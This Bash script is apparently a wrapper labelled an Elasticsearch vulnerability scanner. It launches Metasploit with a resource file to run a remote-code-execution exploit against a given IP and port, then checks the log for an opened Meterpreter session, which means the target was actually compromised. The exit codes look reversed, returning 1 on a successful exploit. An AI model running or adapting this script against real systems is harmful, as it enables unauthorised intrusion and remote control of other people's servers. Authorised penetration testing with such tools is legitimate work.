#!/bin/bash

#Elastic Search vulnerability scanner
#Vulnerability: Remote Code Execution on unsecured API
#This script is used to scan the host for the presence of Elastic Search vulnerabilities
#Script runs the exploit on a target machine and monitors for exploit's execution success

#Parameters
#Script ip_address port_number

#Make Sure The Correct Arguments are passed
if [ $# -ne 2 ]
then
	echo "Usage: $0 <host_ip> <host_port>"
	exit 1
fi

#Save all the arguments in variables
IP_ADDR=$1
PORT_NO=$2

#Check for the required utilities
#Check if the metasploit framework is available
if ! command -v msfconsole &> /dev/null; then
    echo "This module requires msfconsole to be installed."
    exit 1
fi


#Export the variables so they can be taken in by Metasploit
export IP_ADDR
export PORT_NO



#Run Metasploit using the RC script
command msfconsole -r elasticsearch.rc &> ./log


#Check if the script contains a successful exploit
if grep -q -E "Meterpreter session . opened" log;
then 
	exit 1
else 
	exit 0
fi

